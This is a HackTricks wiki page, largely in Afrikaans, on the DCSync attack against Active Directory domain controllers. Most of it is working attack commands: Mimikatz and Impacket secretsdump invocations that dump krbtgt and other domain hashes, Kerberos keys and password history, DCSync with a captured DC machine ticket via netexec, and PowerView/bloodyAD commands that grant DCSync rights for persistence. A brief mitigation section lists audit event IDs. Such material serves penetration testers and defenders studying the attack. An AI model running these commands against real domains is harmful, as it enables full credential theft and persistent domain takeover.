# DCSync

{{#include ../../banners/hacktricks-training.md}}

## DCSync

Die **DCSync**-toestemming impliseer dat jy hierdie toestemmings oor die domein self het: **DS-Replication-Get-Changes**, **Replicating Directory Changes All** en **Replicating Directory Changes In Filtered Set**.<sup>[[3]](#references)</sup>

**Belangrike notas oor DCSync:**

- Die **DCSync-aanval boots die gedrag van ’n Domain Controller na en versoek ander Domain Controllers om inligting te repliseer** deur die Directory Replication Service Remote Protocol (MS-DRSR) te gebruik. Omdat MS-DRSR ’n geldige en noodsaaklike funksie van Active Directory is, kan dit nie afgeskakel of gedeaktiveer word nie.
- By verstek het slegs die groepe **Domain Admins, Enterprise Admins, Administrators en Domain Controllers** die vereiste voorregte.
- In die praktyk vereis **volledige DCSync** **`DS-Replication-Get-Changes` + `DS-Replication-Get-Changes-All`** op die domeinnaamkonteks. `DS-Replication-Get-Changes-In-Filtered-Set` word dikwels saam met hulle gedelegeer, maar op sy eie is dit meer relevant vir die sinkronisering van **vertroulike / RODC-gefiltreerde attribute** (byvoorbeeld geheime van die ouer LAPS-styl) as vir ’n volledige krbtgt-dump.<sup>[[2]](#references)</sup>
- As enige rekeningwagwoorde met omkeerbare enkripsie gestoor word, is daar ’n opsie in Mimikatz om die wagwoord as gewone teks terug te gee.

### Enumerasie

Kyk wie hierdie toestemmings het deur `powerview` te gebruik:

```bash
Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ?{($_.ObjectType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll') -or ($_.ActiveDirectoryRights -match 'WriteDacl')}
```

As jy op **nie-standaard principals** met DCSync-regte wil fokus, filter die ingeboude groepe met replikasievermoë uit en hersien slegs onverwagte trustees:

```powershell
$domainDN = "DC=dollarcorp,DC=moneycorp,DC=local"
$default = "Domain Controllers|Enterprise Domain Controllers|Domain Admins|Enterprise Admins|Administrators"
Get-ObjectAcl -DistinguishedName $domainDN -ResolveGUIDs |
  Where-Object {
    $_.ObjectType -match 'replication-get' -or
    $_.ActiveDirectoryRights -match 'GenericAll|WriteDacl'
  } |
  Where-Object { $_.IdentityReference -notmatch $default } |
  Select-Object IdentityReference,ObjectType,ActiveDirectoryRights
```

### Exploit plaaslik

```bash
Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'
```

### Exploit op afstand

```bash
secretsdump.py -just-dc <user>:<password>@<ipaddress> -outputfile dcsync_hashes
[-just-dc-user <USERNAME>] #To get only of that user
[-ldapfilter '(adminCount=1)'] #Or scope the dump to objects matching an LDAP filter
[-just-dc-ntlm] #Only NTLM material, faster/cleaner when you don't need Kerberos keys
[-pwd-last-set] #To see when each account's password was last changed
[-user-status] #Show if the account is enabled/disabled while dumping
[-history] #To dump password history, may be helpful for offline password cracking
```

Praktiese afgebakende voorbeelde:<sup>[[1]](#references)</sup>

```bash
# Only the krbtgt account
secretsdump.py -just-dc-user krbtgt <DOMAIN>/<USER>:<PASSWORD>@<DC_IP>

# Only privileged objects selected through LDAP
secretsdump.py -just-dc-ntlm -ldapfilter '(adminCount=1)' <DOMAIN>/<USER>:<PASSWORD>@<DC_IP>

# Add metadata and password history for cracking/reuse analysis
secretsdump.py -just-dc-ntlm -history -pwd-last-set -user-status <DOMAIN>/<USER>:<PASSWORD>@<DC_IP>
```

### DCSync met ’n vasgelegde DC-masjien-TGT (ccache)

Wanneer jy ’n diens op ’n domeinbeheerder ondersoek, onderskei tussen die plaaslike diensidentiteit en die netwerkidentiteit daarvan. [Microsoft dokumenteer](https://learn.microsoft.com/en-us/sql/database-engine/configure-windows/configure-windows-service-accounts-and-permissions) dat SQL Server-virtuele rekeninge (`NT SERVICE\...`) toegang tot netwerkhulpbronne kry as die gasheerrekenaarrekening. Op ’n domeinbeheerder kan dit die DC-masjienrekening relevant maak wanneer jy replikasieregte nagaan, maar ’n diensvoeteplek alleen bewys nie dat ’n uitvoerbare masjien-TGT beskikbaar is of dat bruikbare DCSync-verifikasie moontlik is nie. Verifieer die werklike diensidentiteit, uitgaande verifikasiekonteks, beskikbare kaartjie of geloofsbriewe, en effektiewe replikasieregte voordat jy dit as ’n moontlike roete beskou.

In unconstrained-delegation export-mode-scenario’s kan jy ’n domeinbeheerder-masjien-TGT vaslê (bv. `DC1$@DOMAIN` vir `krbtgt@DOMAIN`). Jy kan dan daardie ccache gebruik om as die DC te verifieer en DCSync sonder ’n wagwoord uit te voer.<sup>[[5]](#references)</sup>

```bash
# Generate a krb5.conf for the realm (helper)
netexec smb <DC_FQDN> --generate-krb5-file krb5.conf
sudo tee /etc/krb5.conf < krb5.conf

# netexec helper using KRB5CCNAME
KRB5CCNAME=DC1$@DOMAIN.TLD_krbtgt@DOMAIN.TLD.ccache \
  netexec smb <DC_FQDN> --use-kcache --ntds

# Or Impacket with Kerberos from ccache
KRB5CCNAME=DC1$@DOMAIN.TLD_krbtgt@DOMAIN.TLD.ccache \
  secretsdump.py -just-dc -k -no-pass <DOMAIN>/ -dc-ip <DC_IP>
```

Bedryfsnotas:

- **Impacket se Kerberos-pad raak eers SMB aan** voordat die DRSUAPI-aanroep plaasvind. As die omgewing **SPN-teikennaamvalidering** afdwing, kan ’n volledige dump misluk met `Policy SPN target name validation might be restricting full DRSUAPI dump. Try -just-dc-user`.
- In daardie geval kan jy óf eers ’n **`cifs/<dc>`**-dienst kaartjie vir die teiken-DC aanvra, óf terugval op **`-just-dc-user`** vir die rekening wat jy dadelik nodig het.
- Wanneer jy net laer replikasieregte het, kan LDAP/DirSync-styl-sinkronisering steeds **vertroulike** of **RODC-gefiltreerde** eienskappe blootlê (byvoorbeeld die verouderde `ms-Mcs-AdmPwd`) sonder ’n volledige krbtgt-replikasie.<sup>[[2]](#references)</sup>

`-just-dc` genereer 3 lêers:

- een met die **NTLM-hashes**
- een met die **Kerberos-sleutels**
- een met klartekswagwoorde uit die NTDS vir enige rekeninge waarvoor [**omkeerbare enkripsie**](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/store-passwords-using-reversible-encryption) geaktiveer is. Jy kan gebruikers met omkeerbare enkripsie kry met

  ```bash
  Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} |select samaccountname,useraccountcontrol
  ```

### Volharding

As jy 'n domeinadministrateur is, kan jy hierdie toestemmings met behulp van PowerView aan enige gebruiker toeken:<sup>[[3]](#references)</sup>

```bash
Add-ObjectAcl -TargetDistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -PrincipalSamAccountName username -Rights DCSync -Verbose
```

Linux-operateurs kan dieselfde met `bloodyAD` doen:

```bash
bloodyAD --host <DC_IP> -d <DOMAIN> -u <USER> -p '<PASSWORD>' add dcsync <TRUSTEE>
```

Dan kan jy **kontroleer of die gebruiker korrek aan** die 3 voorregte toegewys is deur daarna in die uitvoer van te soek (jy behoort die name van die voorregte binne die "ObjectType"-veld te kan sien):

```bash
Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ?{$_.IdentityReference -match "student114"}
```

### Versagting

- Sekuriteitsgebeurtenis-ID 4662 (Ouditbeleid vir objek moet geaktiveer wees) – ’n Bewerking is op ’n objek uitgevoer<sup>[[4]](#references)</sup>
- Sekuriteitsgebeurtenis-ID 5136 (Ouditbeleid vir objek moet geaktiveer wees) – ’n Directory Service-objek is gewysig
- Sekuriteitsgebeurtenis-ID 4670 (Ouditbeleid vir objek moet geaktiveer wees) – Toestemmings op ’n objek is verander
- AD ACL Scanner - Skep en vergelyk verslae van ACL's. [https://github.com/canix1/ADACLScanner](https://github.com/canix1/ADACLScanner)

## References

- [1] [Impacket-veranderingslogboek](https://github.com/fortra/impacket/blob/master/ChangeLog.md)
- [2] [DirSync: Benutting van replikasie Get-Changes en Get-Changes-In-Filtered-Set](https://simondotsh.com/infosec/2022/07/11/dirsync.html)
- [3] [DCSync: Stort wagwoord-hashes vanaf domeinbeheerder](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/dump-password-hashes-from-domain-controller-with-dcsync)
- [4] [DCSync](https://yojimbosecurity.ninja/dcsync/)
- [5] [HTB: Delegate — SYSVOL creds → Targeted Kerberoast → Unconstrained Delegation → DCSync na DA](https://0xdf.gitlab.io/2025/09/12/htb-delegate.html)
{{#include ../../banners/hacktricks-training.md}}
